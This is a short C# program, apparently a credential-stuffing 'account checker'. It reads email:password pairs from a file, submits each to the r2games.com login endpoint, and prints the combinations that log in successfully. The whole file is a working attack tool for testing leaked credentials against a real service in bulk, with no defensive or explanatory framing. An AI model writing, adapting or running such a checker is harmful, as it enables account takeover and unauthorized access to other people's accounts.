using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;
using System.Text;
using xNet;
using System.IO;

namespace SimpleChecker
{
    class Program
    {
        static void Main(string[] args)
        {
            int check = 0;

            int live = 0;
            int dead = 0;

            List<string> accounts = new List<string>(File.ReadAllLines("accounts.txt"));

            foreach (string account in accounts)
            {

                using (HttpRequest request = new HttpRequest())
                {

                    Console.Title = ("To Check: " + accounts.Count + " Checked: " + check + " Dead: " + dead + " Live: " + live + "                  Simple Checker developed by LilToba :)");

                    string email = account.Split(':')[0];
                    string pass = account.Split(':')[1];

                    request.UserAgent = "";
                    request.Cookies = new CookieDictionary(false);
                    request.Proxy = null;
                    request.IgnoreProtocolErrors = true;
                    request.AllowAutoRedirect = true;
                    request.KeepAlive = true;

                    request.AddParam("login_id", email);
                    request.AddParam("login_pwd", pass);
                    request.AddParam("code", "");
                    request.AddParam("keep_login", "0");

                    string response = request.Post("https://www.r2games.com/user/?ac=login").ToString();

                    if (response.Contains("{\"state\":true}"))
                    {
                        Console.WriteLine("VALID ACCOUNT! -> " + account);
                        check += 1;
                        live += 1;
                    }
                    else
                    {
                        check += 1;
                        dead += 1;
                    }
                }
            }
        }
    }
}
